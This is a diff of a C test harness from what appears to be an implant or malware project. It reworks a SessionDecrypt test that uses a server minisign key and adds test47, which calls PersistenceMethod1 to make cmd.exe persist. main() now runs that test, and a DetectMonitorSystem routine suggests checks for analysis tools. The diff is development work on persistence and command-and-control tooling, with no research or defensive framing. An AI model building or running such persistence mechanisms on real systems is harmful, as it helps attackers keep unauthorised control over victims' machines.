@@ -737,9 +737,9 @@ void test38() {
 }
 
 void test39() {
-	BYTE Msg[] = { 69, 100, 241, 205, 130, 19, 84, 64, 192, 139, 112, 170, 174, 238, 194, 80, 174, 195, 105, 64, 246, 2, 239, 184, 35, 205, 42, 85, 150, 16, 225, 147, 228, 17, 249, 8, 118, 174, 211, 177, 206, 159, 245, 113, 219, 53, 45, 186, 203, 94, 182, 76, 5, 77, 176, 249, 35, 22, 67, 237, 95, 71, 186, 35, 204, 13, 153, 248, 66, 4, 39, 6, 162, 3, 218, 1, 175, 173, 130, 127, 18, 224, 155, 253, 10, 118, 58, 148, 82, 75, 107, 121, 234, 27, 1, 162, 86, 123, 42, 86, 137, 119, 235, 218, 226, 89, 159, 36, 134, 161, 199, 18, 63, 48, 84, 251, 126, 144, 111, 105, 252, 50, 71, 3, 180, 224, 167, 23, 175, 99, 229, 48, 200, 185, 145, 130, 91, 25, 33, 98, 52, 247, 201, 120, 221, 199, 41, 247, 222, 191, 90, 65, 87, 50, 18, 145, 56, 106, 208, 228 };
+	/*BYTE Msg[] = { 69, 100, 241, 205, 130, 19, 84, 64, 192, 139, 112, 170, 174, 238, 194, 80, 174, 195, 105, 64, 246, 2, 239, 184, 35, 205, 42, 85, 150, 16, 225, 147, 228, 17, 249, 8, 118, 174, 211, 177, 206, 159, 245, 113, 219, 53, 45, 186, 203, 94, 182, 76, 5, 77, 176, 249, 35, 22, 67, 237, 95, 71, 186, 35, 204, 13, 153, 248, 66, 4, 39, 6, 162, 3, 218, 1, 175, 173, 130, 127, 18, 224, 155, 253, 10, 118, 58, 148, 82, 75, 107, 121, 234, 27, 1, 162, 86, 123, 42, 86, 137, 119, 235, 218, 226, 89, 159, 36, 134, 161, 199, 18, 63, 48, 84, 251, 126, 144, 111, 105, 252, 50, 71, 3, 180, 224, 167, 23, 175, 99, 229, 48, 200, 185, 145, 130, 91, 25, 33, 98, 52, 247, 201, 120, 221, 199, 41, 247, 222, 191, 90, 65, 87, 50, 18, 145, 56, 106, 208, 228 };
 	CHAR szServerMinisignPublicKey[] = "untrusted comment: minisign public key: 8BC040541382CDF1\nRWTxzYITVEDAi0WSY4oCDg/kTkSnjDCcsPuXF4xm/kyh434uy6PHFiUq";
-	SessionDecrypt(NULL, Msg, _countof(Msg), szServerMinisignPublicKey, NULL);;
+	SessionDecrypt(NULL, Msg, _countof(Msg), szServerMinisignPublicKey, NULL);;*/
 }
 
 void test40() {
@@ -823,7 +823,8 @@ void test45() {
 
 	pClient->pSessionKey = pSessionKey;
 	pClient->cbSessionKey = _countof(pSessionKey);
-	pPlainText = SessionDecrypt(pClient, Msg, _countof(Msg), szServerMinisignPubKey, &cbPlainText);
+	pClient->lpServerMinisignPublicKey = szServerMinisignPubKey;
+	pPlainText = SessionDecrypt(pClient, Msg, _countof(Msg), &cbPlainText);
 	HexDump(pPlainText, cbPlainText);
 	FREE(pClient);
 }
@@ -838,6 +839,12 @@ void test46() {
 	pPlainText = Chacha20Poly1305DecryptAndVerify(Key, Nonce, CipherText, _countof(CipherText), NULL, 0, &cbPlainText);
 	HexDump(pPlainText, cbPlainText);
 	FREE(pPlainText);
+}
+
+void test47() {
+	CHAR szCommandLine[] = "C:\\Windows\\System32\\cmd.exe";
+
+	PersistenceMethod1(szCommandLine);
 }
 
 VOID DetectMonitorSystem() {
@@ -911,7 +918,8 @@ int main() {
 	//test42();
 	//test43();
 	//test44();
-	test45();
+	//test45();
 	//test46();
+	test47();
 	return 0;
 }
